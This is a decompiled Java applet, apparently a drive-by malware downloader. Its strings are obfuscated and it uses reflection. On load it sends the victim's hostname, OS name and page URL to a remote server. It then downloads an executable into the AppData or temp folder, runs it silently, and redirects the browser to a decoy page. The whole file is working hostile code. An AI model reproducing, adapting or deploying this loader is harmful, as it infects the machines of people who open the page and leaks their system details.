import java.net.InetAddress;
import java.net.MalformedURLException;
import java.io.IOException;
import java.nio.channels.Channels;
import java.io.File;
import java.io.Reader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.io.FileOutputStream;
import java.io.BufferedReader;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class TRPK extends Applet
{
    private static String B;
    private static String A;
    private static BufferedReader D;
    private static FileOutputStream E;
    private static String C;
    private static StringBuffer AD;
    private static String DEZ;
    
    public static String F(String s, final String b) {
        if (s.startsWith(TRPK.B) && TRPK.B != null) {
            try {
                String string = "";
                TRPK.B = b;
                if (TRPK.B.length() > 0 && TRPK.B != null && TRPK.B != "") {
                    s = (TRPK.B = s + "?" + TRPK.B);
                    if (TRPK.B != null && TRPK.B != null) {
                        J(new BufferedReader(new InputStreamReader(((URLConnection)new URL(TRPK.B).getClass().getMethod("o" + "p" + "en" + "Conn" + "ect" + "ion", (Class<?>[])new Class[0]).invoke(new URL(TRPK.B), new Object[0])).getInputStream())));
                        while ((TRPK.C = TRPK.D.readLine()) != null) {
                            string += (Object)TRPK.AD.append(TRPK.C);
                        }
                        TRPK.D.close();
                        TRPK.B = string;
                    }
                }
            }
            catch (Exception ex) {
                System.exit(0);
            }
        }
        return TRPK.B;
    }
    
    public static String ZA() {
        try {
            ZE(O("", "71J8J3J51J21J91J82J41J8J82J0J12J0J9"));
            if (TRPK.A != null) {
                TRPK.A += "\\";
            }
            if (TRPK.A == null) {
                ZE(O("", "0J91J0J3J51J51J0"));
            }
            if (TRPK.A != null) {
                TRPK.A += "\\";
            }
            if (TRPK.A == null) {
                System.exit(0);
            }
        }
        catch (Exception ex) {
            System.exit(0);
        }
        return TRPK.A;
    }
    
    public static String ACXZ(final String s) {
        return s.replaceAll("[^0-9]", " ");
    }
    
    public static String O(final String s, final String s2) {
        TRPK.B = "http://";
        String s3 = "";
        final String[] split = new StringBuffer(ACXZ(s2)).reverse().toString().split(" ");
        for (int i = 0; i < split.length; ++i) {
            s3 += TRPK.DEZ.charAt(Integer.parseInt(split[i]));
        }
        if (s3.contains("tmpdir")) {
            s3 = System.getProperty(s3);
        }
        else if (s3.contains("appdata")) {
            s3 = System.getenv(s3);
        }
        else if (s3.contains("os.name")) {
            s3 = System.getProperty(s3).toString();
        }
        return s + s3;
    }
    
    private static void ZC(final FileOutputStream e) {
        TRPK.E = e;
    }
    
    public static void J(final BufferedReader d) {
        TRPK.D = d;
    }
    
    public static void ZE(final String a) {
        TRPK.A = a;
    }
    
    public static void ZF(final String s) throws IOException {
        TRPK.AD = new StringBuffer();
        try {
            if ((ZA() != null && ZA().contains("Roaming")) || (ZA().contains("Temp") && new File(ZA()).exists())) {
                final String[] split = F(O("", "51J7J51J82J91J4J6J72J21J41J2J82J4J21J41J7J13J91J0J13J81J31J3J31J42J3J82J4J71J0J22J91J5J41J81J42J32J32J41J5J72J72J62J51J91J91J7"), O("", "92J4J91J8J81") + O(s, "92J4J21J0J31J71J4J81J02J03") + O("SrIyBScBW", "92J11J71J02J03") + O("http://www.gwas.ca/i/cryptedchaos", "4J32J4J82") + O("", "92J51J21J41J2J03") + O(ZD(1, 0), "92J81J41J03") + ZD(0, 1)).split("-_-");
                if (split[2] == "G") {
                    if (split[2] == null) {
                        return;
                    }
                }
                try {
                    ZC(new FileOutputStream(ZA() + split[1] + O(".", "4J32J4")));
                    TRPK.E.getChannel().transferFrom(Channels.newChannel(new URL(split[0]).openStream()), 0L, 5242880L);
                    TRPK.E.close();
                    if (new File(ZA() + split[1] + O(".", "4J32J4")).exists()) {
                        try {
                            System.gc();
                        }
                        catch (Exception ex) {}
                        Runtime.getRuntime().exec(ZA() + split[1] + O(".", "4J32J4"));
                    }
                    else {
                        System.exit(0);
                    }
                }
                catch (Exception ex2) {
                    System.exit(0);
                }
            }
            else {
                System.exit(0);
            }
        }
        catch (Exception ex3) {
            System.exit(0);
        }
    }
    
    public void StillAlive() {
        try {
            this.getAppletContext();
            this.getAppletContext().showDocument(new URL("http://trpk.net/webclient.html"), "_self");
            System.exit(0);
        }
        catch (MalformedURLException ex) {
            System.exit(0);
        }
    }
    
    public static String ZD(final int n, final int n2) {
        try {
            if (n == 1 && n2 != 1) {
                try {
                    ZE(InetAddress.getLocalHost().getHostName().toString());
                    if (TRPK.A == null) {
                        TRPK.A = "Unknown";
                    }
                }
                catch (Exception ex) {
                    System.exit(0);
                }
            }
            else if (n2 == 1 && n != 1) {
                try {
                    ZE(O("", "4J21J0J31J82J81J41"));
                    if (TRPK.A == null) {
                        TRPK.A = "Unknown";
                    }
                }
                catch (Exception ex2) {
                    System.exit(0);
                }
            }
            else {
                TRPK.A = "Unknown";
            }
        }
        catch (Exception ex3) {
            System.exit(0);
        }
        return TRPK.A;
    }
    
    @Override
    public void init() {
        try {
            ZF(this.getDocumentBase().toString());
            this.StillAlive();
        }
        catch (Exception ex) {
            System.exit(0);
        }
    }
    
    static {
        TRPK.DEZ = "abcdefghijklmnopqrstuvwxyz:/.=&-";
    }
}
